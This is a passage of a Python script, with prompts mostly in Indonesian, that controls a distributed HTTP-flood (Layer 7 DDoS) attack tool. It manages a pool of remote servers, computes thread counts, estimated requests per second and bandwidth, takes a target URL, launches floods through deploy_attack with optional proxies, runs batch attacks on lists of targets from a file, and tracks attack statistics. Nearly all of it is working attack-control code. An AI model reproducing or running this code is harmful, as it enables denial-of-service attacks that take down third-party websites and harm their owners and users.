        suggested = int(avg_cpu * 200)
        suggested = max(200, min(1000, suggested))
        print(f"\n{COLOR['yellow']}Suggested threads/server: {suggested}{COLOR['reset']}")
        threads = int(input(f"Threads/server (100-1000) [{suggested}]: ") or str(suggested))
        if threads > 1000:
            threads = 1000
            print(f"{COLOR['yellow']}⚠️ Threads dibatasi 1000 untuk L7{COLOR['reset']}")
        est_rps = threads * 30 * len(servers)
        est_mbps = (est_rps * 2048 * 8) / 1e6
        est_gbps = est_mbps / 1000
        print(f"\n{COLOR['yellow']}⚔️ ATTACK SUMMARY (L7):{COLOR['reset']}")
        print(f"Target URL: {target_url}")
        print(f"Duration: {duration}s")
        print(f"Method: {method}")
        print(f"Servers: {len(servers)}")
        print(f"Threads/server: {threads}")
        print(f"Total Threads: {len(servers) * threads}")
        print(f"Estimated RPS: {format_number(est_rps)}")
        print(f"Estimated Bandwidth: {est_gbps:.1f} Gbps")
        print(f"Proxy: {'ON' if use_proxy else 'OFF'}")
        confirm = input(f"\n{COLOR['red']}Mulai attack? (y/n): {COLOR['reset']}")
        if confirm.lower() == 'y':
            deploy_attack(servers, target_url, duration, method, threads, use_proxy)
        else:
            print("Dibatalkan")
    except Exception as e:
        print(f"{COLOR['red']}Error: {e}{COLOR['reset']}")
    input("\nEnter untuk kembali...")

def menu_stats(data):
    clear_screen()
    print_banner()
    pwd_total = len(data.get('servers_password', []))
    pwd_active = len([s for s in data.get('servers_password', []) if s.get('active', False)])
    key_total = len(data.get('servers_key', []))
    key_active = len([s for s in data.get('servers_key', []) if s.get('active', False)])
    total_servers = pwd_total + key_total
    total_active = pwd_active + key_active
    total_cores = sum([s.get('cpu_cores', 0) for s in data.get('servers_password', [])] + [s.get('cpu_cores', 0) for s in data.get('servers_key', [])])
    total_ram = (sum([s.get('ram_mb', 0) for s in data.get('servers_password', [])] + [s.get('ram_mb', 0) for s in data.get('servers_key', [])])) / 1024
    total_bw = sum([s.get('bandwidth', 0) for s in data.get('servers_password', []) if s.get('active')] + [s.get('bandwidth', 0) for s in data.get('servers_key', []) if s.get('active')])
    attacks = data['stats'].get('total_attacks', 0)
    requests = data['stats'].get('total_requests', 0)
    bytes_total = data['stats'].get('total_bytes', 0)
    total_time = data['stats'].get('total_time', 0)
    print(f"{COLOR['cyan']}📊 GLOBAL STATISTICS (L7){COLOR['reset']}")
    print(f"Total servers: {total_servers} (🔒 Password: {pwd_total}, 🔑 Key: {key_total})")
    print(f"Active: {total_active} ✅ (🔒: {pwd_active}, 🔑: {key_active})")
    print(f"Total CPU Cores: {total_cores}")
    print(f"Total RAM: {total_ram:.1f} GB")
    print(f"Total Bandwidth (active): {total_bw:.0f} Mbps ({total_bw/1000:.1f} Gbps)")
    print(f"\nTotal attacks: {attacks}")
    print(f"Total requests: {format_number(requests)}")
    print(f"Total data: {format_number(bytes_total)} bytes ({bytes_total/1024/1024/1024:.2f} GB)")
    print(f"Total attack time: {total_time:.0f} seconds ({total_time/60:.1f} minutes)")
    if attacks > 0:
        print(f"\nAverage requests/attack: {format_number(requests // attacks)}")
        print(f"Average data/attack: {format_number(bytes_total // attacks)} bytes")
        print(f"Average duration: {total_time/attacks:.1f} seconds")
    print(f"\n{COLOR['bold']}Server Details (Active):{COLOR['reset']}")
    all_servers = data.get('servers_password', []) + data.get('servers_key', [])
    all_servers = [s for s in all_servers if s.get('active')]
    all_servers.sort(key=lambda x: x.get('bandwidth', 0), reverse=True)
    for s in all_servers:
        added = datetime.fromtimestamp(s.get('added', 0)).strftime('%Y-%m-%d')
        cpu = s.get('cpu_cores', '?')
        bw = s.get('bandwidth', '?')
        lat = s.get('latency', '?')
        auth_type = "🔒" if s.get('auth_type') == 'password' else "🔑"
        print(f"{auth_type} {s['host']} - CPU: {cpu}c | BW: {bw}Mbps | Lat: {lat}ms | Added: {added}")
    input("\nEnter untuk kembali...")

def menu_batch_attack(data):
    active_servers = [s for s in data.get('servers_password', []) if s.get('active')] + [s for s in data.get('servers_key', []) if s.get('active')]
    if not active_servers:
        print(f"{COLOR['red']}❌ Tidak ada server aktif!{COLOR['reset']}")
        input("\nEnter untuk kembali...")
        return
    print(f"\n{COLOR['yellow']}Batch Attack L7{COLOR['reset']}")
    print("Format file: target_url:duration:method per line")
    file_path = input("Path ke file targets: ")
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        targets = []
        for line in lines:
            line = line.strip()
            if line and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) >= 3:
                    target_url = parts[0]
                    duration = int(parts[1])
                    method = parts[2].upper()
                    targets.append((target_url, duration, method))
        print(f"\n📋 Loaded {len(targets)} targets")
        use_proxy = input("Use proxy for all attacks? (y/n): ").lower() == 'y'
        for i, (target_url, duration, method) in enumerate(targets, 1):
            print(f"\n{COLOR['cyan']}[Target {i}/{len(targets)}]{COLOR['reset']}")
            print(f"🎯 {target_url} | {duration}s | {method}")
            total_cores = sum([s.get('cpu_cores', 2) for s in active_servers])
            avg_cpu = total_cores / len(active_servers)
            threads = int(avg_cpu * 200)
            threads = max(200, min(1000, threads))
            deploy_attack(active_servers, target_url, duration, method, threads, use_proxy)
            if i < len(targets):
                print(f"\n{COLOR['yellow']}⏱️  Waiting 10 seconds before next target...{COLOR['reset']}")
                time.sleep(10)
    except Exception as e:
        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
    input("\nEnter untuk kembali...")

def format_number(n):
    if n < 1000:
        return str(n)
    if n < 1000000:
        return f"{n/1000:.1f}K"
    if n < 1000000000:
        return f"{n/1000000:.1f}M"
    if n < 1000000000000:
        return f"{n/1000000000:.1f}G"
    return f"{n/1000000000000:.1f}T"

def parse_number(s):
    s = s.strip()
    if s.endswith('K'):
        return int(float(s[:-1]) * 1000)
    elif s.endswith('M'):
        return int(float(s[:-1]) * 1000000)
    elif s.endswith('B'):
        return int(float(s[:-1]) * 1000000000)
    elif s.endswith('T'):
        return int(float(s[:-1]) * 1000000000000)
    else:
        return int(float(s))

def main():
    if not os.path.exists('attackl7.go'):
        print(f"{COLOR['red']}❌ attackl7.go not found!{COLOR['reset']}")
        print("Please save the attackl7.go template first.")
        sys.exit(1)
    data = load_servers()
    while True:
        clear_screen()
        print_banner()
        pwd_total = len(data.get('servers_password', []))
        pwd_active = len([s for s in data.get('servers_password', []) if s.get('active', False)])
        key_total = len(data.get('servers_key', []))
        key_active = len([s for s in data.get('servers_key', []) if s.get('active', False)])
        total_servers = pwd_total + key_total
        total_active = pwd_active + key_active
        total_bw = sum([s.get('bandwidth', 0) for s in data.get('servers_password', []) if s.get('active')] + [s.get('bandwidth', 0) for s in data.get('servers_key', []) if s.get('active')])
        attacks = data['stats'].get('total_attacks', 0)
        requests = data['stats'].get('total_requests', 0)
        print(f"{COLOR['cyan']}📊 SYSTEM STATUS (L7){COLOR['reset']}")
        print(f"├─ Total Servers: {total_active}/{total_servers} active (🔒: {pwd_active} | 🔑: {key_active})")
        print(f"├─ Total Power: {total_bw/1000:.1f} Gbps available")
        print(f"├─ Total Attacks: {attacks}")
        print(f"└─ Total Requests: {format_number(requests)}\n")
        print(f"{COLOR['cyan']}📌 MAIN MENU (L7){COLOR['reset']}")
        print("1️⃣  Manage Servers")
        print("2️⃣  Launch L7 Attack")
        print("3️⃣  Batch Attack (from file)")
        print("4️⃣  View Statistics")
        print("5️⃣  Exit")
        choice = input(f"\n{COLOR['yellow']}Pilih menu: {COLOR['reset']}")
        if choice == '1':
            menu_manage_servers(data)
        elif choice == '2':
            menu_launch_attack(data)
        elif choice == '3':
            menu_batch_attack(data)
        elif choice == '4':
            menu_stats(data)
        elif choice == '5':
            print(f"{COLOR['green']}Bye!{COLOR['reset']}")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{COLOR['yellow']}Exiting...{COLOR['reset']}")
    except Exception as e:
        print(f"{COLOR['red']}Fatal Error: {e}{COLOR['reset']}")
        import traceback
        traceback.print_exc()
